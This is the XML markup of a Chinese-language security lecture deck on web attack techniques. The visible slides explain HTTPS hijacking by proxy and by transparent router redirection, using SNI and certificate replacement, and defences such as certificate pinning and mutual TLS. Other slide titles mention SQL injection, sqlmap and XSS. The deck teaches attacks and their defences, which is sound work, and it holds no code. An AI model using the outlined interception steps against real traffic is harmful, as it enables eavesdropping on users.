            <a:ext cx="4811785" cy="4114800"/>
          </a:xfrm>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</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275" y="2755246"/>
            <a:ext cx="4838700" cy="3552825"/>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150938" y="2268538"/>
            <a:ext cx="2314574" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="474340" y="1327944"/>
            <a:ext cx="8124825" cy="714375"/>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5853" y="2268537"/>
            <a:ext cx="3011163" cy="4114801"/>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代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="474340" y="1327944"/>
            <a:ext cx="8124825" cy="714375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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0938" y="2268538"/>
            <a:ext cx="2314574" cy="4114800"/>
          </a:xfr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1918" y="2268538"/>
            <a:ext cx="2556588" cy="4114800"/>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150938" y="1927387"/>
            <a:ext cx="6702051" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="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86423" y="1484630"/>
            <a:ext cx="4838700" cy="3552825"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="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55584"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>浏览器无需设置代理，路由器直接将流量转给中间人进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>透明劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1820863" y="2847684"/>
            <a:ext cx="5448300" cy="3476625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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255583"/>
            <a:ext cx="7772400" cy="4921281"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>浏览器无需设置代理，路由器直接将流量转给中间人进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>客户端连接服务器；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>路由器重定向客户端连接到中间人；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中间人通过 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SNI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>获知需要连接哪个具体的目标网站；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>替换证书</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>... </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>成功劫持 （同代理劫持）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>透明劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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2829" y="1289696"/>
            <a:ext cx="7772400" cy="547348"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为什么要用到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SNI</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>透明劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="图片 18"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1173816" y="1837044"/>
            <a:ext cx="6630426" cy="4460688"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1478943" y="5049078"/>
            <a:ext cx="1773140" cy="119270"/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="文本框 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5363088" y="1432048"/>
            <a:ext cx="2675732" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TLS 1.2  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ClientHello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>消息</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2829" y="1498180"/>
            <a:ext cx="7772400" cy="4267517"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>服务器证书锁定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SSL/TLS pinning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>把服务器证书或其它安全凭证内置在客户端，在客户端访问服务器时会验证服务器证书有没有被替换</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>常用于移动</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>APP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Twitter, Google</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>系</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>APP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）防</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>通信被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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2828" y="1498180"/>
            <a:ext cx="7869367" cy="4267517"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>最高安全等级：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x509 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>双向认证</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>诸如 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WPA2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>企业级认证 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>EAP-TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的认证方式，很多系统（如网银）都将 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的双向认证作为最高标准、最高安全等级的认证方式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="857250" y="1691323"/>
            <a:ext cx="7818120" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1150938" y="2901950"/>
            <a:ext cx="6477000" cy="1419225"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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防止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>被劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1150938" y="2182813"/>
            <a:ext cx="6467475" cy="2857500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/tags/tag1.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="COMMONDATA" val="eyJoZGlkIjoiYTkyNzU5YmZhNjU4MzM5ZTNjNzVhNGQwZGQwZWI1YzYifQ=="/>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19598</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>全屏显示(4:3)</PresentationFormat>
  <Paragraphs>1412</Paragraphs>
  <Slides>217</Slides>
  <Notes>101</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217</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="238" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>楷体_GB2312</vt:lpstr>
      <vt:lpstr>新宋体</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Webdings</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Arial Narrow</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>PMingLiU</vt:lpstr>
      <vt:lpstr>MingLiU-ExtB</vt:lpstr>
      <vt:lpstr>標楷體</vt:lpstr>
      <vt:lpstr>Batang</vt:lpstr>
      <vt:lpstr>Constantia</vt:lpstr>
      <vt:lpstr>Symbol</vt:lpstr>
      <vt:lpstr>1_Blends</vt:lpstr>
      <vt:lpstr>第 十一 章    Web网站攻击技术</vt:lpstr>
      <vt:lpstr>内容提纲</vt:lpstr>
      <vt:lpstr>Web应用程序体系结构</vt:lpstr>
      <vt:lpstr>Web应用体系结构潜在弱点</vt:lpstr>
      <vt:lpstr>Web应用体系结构潜在弱点</vt:lpstr>
      <vt:lpstr>Web应用安全</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HTTP协议安全问题</vt:lpstr>
      <vt:lpstr>Cookie的安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>Cookie安全问题</vt:lpstr>
      <vt:lpstr>内容提纲</vt:lpstr>
      <vt:lpstr>OWASP十大安全漏洞变迁史</vt:lpstr>
      <vt:lpstr>OWASP</vt:lpstr>
      <vt:lpstr>OWASP</vt:lpstr>
      <vt:lpstr>2007 VS. 2004 (1/2)</vt:lpstr>
      <vt:lpstr>2007 VS. 2004 (2/2)</vt:lpstr>
      <vt:lpstr>十大安全漏洞-OWASP 2007</vt:lpstr>
      <vt:lpstr>OWASP 2013</vt:lpstr>
      <vt:lpstr>OWASP 2013</vt:lpstr>
      <vt:lpstr>OWASP 2017</vt:lpstr>
      <vt:lpstr>OWASP 2017</vt:lpstr>
      <vt:lpstr>OWASP 2017</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>注入漏洞</vt:lpstr>
      <vt:lpstr>SQL注入原理</vt:lpstr>
      <vt:lpstr>SQL注入攻击流程</vt:lpstr>
      <vt:lpstr>SQL注入示例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：案例</vt:lpstr>
      <vt:lpstr>SQL注入：检测</vt:lpstr>
      <vt:lpstr>SQL注入：检测</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>Sqlmap</vt:lpstr>
      <vt:lpstr>防御注入漏洞</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>(一)跨站脚本（XSS）漏洞</vt:lpstr>
      <vt:lpstr>跨站脚本攻击</vt:lpstr>
      <vt:lpstr>XSS攻击的原理</vt:lpstr>
      <vt:lpstr>XSS漏洞探测示例</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式XSS</vt:lpstr>
      <vt:lpstr>储存式</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>反射式XSS</vt:lpstr>
      <vt:lpstr>DOM式XSS</vt:lpstr>
      <vt:lpstr>DOM式XSS</vt:lpstr>
      <vt:lpstr>防御XSS攻击</vt:lpstr>
